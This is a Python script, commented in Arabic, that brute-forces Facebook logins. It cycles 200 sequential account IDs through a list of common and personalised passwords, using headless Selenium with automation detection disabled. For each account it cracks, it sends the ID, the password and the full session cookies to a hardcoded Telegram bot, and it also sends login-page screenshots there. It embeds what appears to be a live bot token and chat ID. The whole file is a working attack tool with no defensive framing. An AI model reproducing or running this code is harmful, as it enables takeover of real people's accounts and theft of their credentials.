import time
import random
import requests
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.keys import Keys

# 🔑 إعدادات تليجرام
TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
CHAT_ID = "5653032481"

# 📋 قائمة 50 كلمة مرور (مختصرة هنا لضمان السرعة)
PASS_LIST = [
    '123456', '12345678', '123456789', 'jasser123', 'malo123', 'jasser2004', 'jasser2005',
    '11223344', '00000000', '123123', '445566', '778899', '102030', 'password', 'love123',
    'king123', 'admin123', '1234567', '7654321', '20002000', '20012001', '20022002', '20032003'
] + [f'jasser{i}' for i in range(2000, 2020)] + ['112233', '223344', '334455', 'password123']

def send_to_tg(text):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': text})
    except: pass

def send_photo_tg(photo_path, caption):
    try:
        with open(photo_path, 'rb') as photo:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", 
                          data={'chat_id': CHAT_ID, 'caption': caption}, files={'photo': photo})
    except: pass

def check_account(uid, send_img=False):
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_argument(f'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110, 122)}.0.0.0 Safari/537.36')
    
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    
    try:
        for pas in PASS_LIST:
            driver.get("https://www.facebook.com")
            time.sleep(random.uniform(2, 4))
            
            email_field = driver.find_element(By.NAME, "email")
            pass_field = driver.find_element(By.NAME, "pass")
            
            email_field.send_keys(uid)
            pass_field.send_keys(pas)
            
            if send_img:
                img_name = f"shot_{uid}.png"
                driver.save_screenshot(img_name)
                send_photo_tg(img_name, f"📸 فحص: {uid} | كلمة: {pas}")
                os.remove(img_name)
                send_img = False # أرسل صورة واحدة فقط لكل حساب للتأكد

            # الضغط الذكي
            pass_field.send_keys(Keys.RETURN)
            time.sleep(6)
            
            cookies = driver.get_cookies()
            if any(cookie['name'] == 'c_user' for cookie in cookies):
                ck = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                send_to_tg(f"✅ تم الاختراق (OK)\n🆔 ID: {uid}\n🔑 PASS: {pas}\n🍪 COOKIE: {ck}")
                break
            elif "checkpoint" in driver.current_url:
                send_to_tg(f"⚠️ مقفل (CP)\n🆔 ID: {uid}\n🔑 PASS: {pas}")
                break
            
            driver.delete_all_cookies() # تنظيف المحاولة
            
    except: pass
    finally: driver.quit()

def run_main():
    start_id = 26701173
    total = 200
    send_to_tg(f"🔥 بدأت عملية الـ {total} حساب.. فحص عميق بـ 50 كلمة مرور.")
    
    ids = [str(start_id + i) for i in range(total)]
    for i, uid in enumerate(ids):
        # سنرسل صوراً لأول 3 حسابات فقط للتأكد من سلامة الضغط
        should_img = True if i < 3 else False
        check_account(uid, send_img=should_img)
        time.sleep(random.uniform(1, 3))

if __name__ == "__main__":
    run_main()
